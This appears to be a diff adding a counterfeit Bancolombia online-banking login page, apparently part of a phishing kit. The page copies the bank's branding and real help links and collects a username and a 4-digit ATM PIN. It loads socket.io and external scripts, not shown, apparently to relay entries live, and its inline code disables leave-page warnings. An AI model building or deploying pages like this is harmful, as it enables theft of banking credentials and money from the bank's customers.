@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        // Eliminar diálogos inmediatamente
+        window.onbeforeunload = null;
+        window.onunload = null;
+        delete window.onbeforeunload;
+        delete window.onunload;
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="shared.js"></script>
+    <script src="script.js" defer></script>
+    <script src="main.js" defer></script>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box">
+                <h2>¡Hola!</h2>
+                <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+                
+                <form class="auth-form">
+                    <div class="form-group">
+                        <div class="input-group">
+                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                                <circle cx="12" cy="7" r="4"/>
+                            </svg>
+                            <div class="input-wrapper">
+                                <input type="text" id="usuario" placeholder="Usuario">
+                                <label for="usuario">Usuario</label>
+                            </div>
+                        </div>
+                        <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/recordar-usuario" class="forgot-link">¿Olvidaste tu usuario?</a>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="input-group">
+                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                            </svg>
+                            <div class="input-wrapper">
+                                <input type="password" id="clave" placeholder="Clave del cajero" maxlength="4" inputmode="numeric" pattern="\d{4}" autocomplete="off" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                                <label for="clave">Clave del cajero</label>
+                            </div>
+                        </div>
+                        <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/crea-tu-clave" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
+                    </div>
+
+                    <button type="submit" class="btn-iniciar" disabled>Iniciar sesión</button>
+                    <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/ingresa-tus-datos" class="create-account">Crear usuario</a>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="help-links">
+        <a href="#">¿Problemas para conectarte?</a>
+        <span class="separator">•</span>
+        <a href="#">Aprende sobre seguridad</a>
+        <span class="separator">•</span>
+        <a href="#">Reglamento Sucursal Virtual</a>
+        <span class="separator">•</span>
+        <a href="#">Política de privacidad</a>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+            </div>
+            <div class="footer-right">
+                <p class="ip-address">Dirección IP: 190.84.119.220</p>
+                <p class="datetime">miércoles, 22 de octubre de 2025, 8:26 p.m.</p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
